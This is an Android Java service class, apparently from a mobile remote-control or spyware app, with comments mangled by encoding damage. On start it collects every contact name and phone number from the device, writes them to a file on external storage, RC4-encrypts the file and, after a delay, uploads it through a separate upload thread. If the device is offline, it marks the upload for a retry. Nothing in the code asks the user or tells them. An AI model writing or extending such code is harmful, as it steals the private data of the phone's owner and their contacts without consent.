//����Service���������Ĺ�����ʵ������PhoneBook��CallLog�����ϴ����ֵ���UploadUtils.java�е�uploadFile������ʵ�֡�

package services;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.util.ArrayList;
import com.system.mobilecontroller.UploadThread;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.text.TextUtils;

public class UploadpbService extends Service
{
	String toBeEncryptedPath = Environment.getExternalStorageDirectory().getPath()+"/Android/ContactME.txt";
	String encryptedPath = Environment.getExternalStorageDirectory().getPath()+"/Android/ContactME_Encrypted.txt";
	Context context = UploadpbService.this;
	private static final String[] PHONES_PROJECTION = new String[] 
	{
	    Phone.DISPLAY_NAME, Phone.NUMBER, Photo.PHOTO_ID,Phone.CONTACT_ID 
	};
	/**��ϵ����ʾ����**/
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;
    /**�绰����**/
    private static final int PHONES_NUMBER_INDEX = 1;
    /**��ϵ�˵�ID**/
    /**��ϵ������**/
    private ArrayList<String> mContactsName = new ArrayList<String>();
    private ArrayList<String> mContactsNumber = new ArrayList<String>();
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate(); 
//		Toast.makeText(context, "it's oncreate()", Toast.LENGTH_LONG).show();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) 
	{
		// TODO Auto-generated method stub
		
		getPhoneContacts();
		
		try 
		{	OutputStream os = null ; 
			os = new FileOutputStream(Environment.getExternalStorageDirectory().getPath()+"/Android/ContactME.txt");//�Ȱ�����д��ȥ���ٶ�ȡ���ļ���
			OutputStreamWriter ow = new OutputStreamWriter(os,Charset.forName("GBK"));
			for(int k = 1 ; k < mContactsName.size() ; k++ )
			{
				String name = mContactsName.get(k) ;//��k��,which represents Name
				String num = mContactsNumber.get(k)+ "\r\n" ; 
				String nm = name + num ; 
				ow.write( nm );
			}
			ow.flush();
			ow.close();
			rc4.NewEnc.start(toBeEncryptedPath,encryptedPath);
		} catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}//create the txt file first when instruction received,then check if the network is available 
		if (NetworkConnected()) {
			new Handler().postDelayed(new Runnable() {
				public void run() {
					// ��ʾdialog

					UploadThread ut = new UploadThread();
					ut.setTar("ContactMe_Encrypted.txt");
					Thread t = new Thread(ut);
					t.start();
				}
			}, 5000); // 5��
		}
		else
		{
			SharedPreferences sp = context.getSharedPreferences("SP",
					MODE_PRIVATE);
			Editor editor = sp.edit();
			editor.putBoolean("phoneBookUploaded", false);
			editor.commit();
			
		}
//		Toast.makeText(context, "it's onStartCommand����", Toast.LENGTH_LONG).show();
		
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
	
	private void getPhoneContacts() 
	{
//		ContentResolver resolver = context.getContentResolver();
//		 ��ȡ�ֻ���ϵ��
		Cursor phoneCursor = getContentResolver().query(Phone.CONTENT_URI,PHONES_PROJECTION, null, null, null);
		if (phoneCursor != null) {
		    while (phoneCursor.moveToNext()) {
			//�õ��ֻ�����
			String phoneNumber = phoneCursor.getString(PHONES_NUMBER_INDEX);
			//���ֻ�����Ϊ�յĻ���Ϊ���ֶ� ������ǰѭ��
			if (TextUtils.isEmpty(phoneNumber))
			    continue;
			//�õ���ϵ������
			String contactName = phoneCursor.getString(PHONES_DISPLAY_NAME_INDEX);
			mContactsName.add(contactName);
			mContactsNumber.add(phoneNumber);
		    }
		    phoneCursor.close();
		}
	 }
	
	/**
	 * ����������״̬�����ж�
	 * @return  true, ���ã� false�� ������
	 */
	private boolean NetworkConnected() {
		ConnectivityManager connManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
		if(connManager.getActiveNetworkInfo() != null) {
			return connManager.getActiveNetworkInfo().isConnected();
		}
		return false;
	}
}
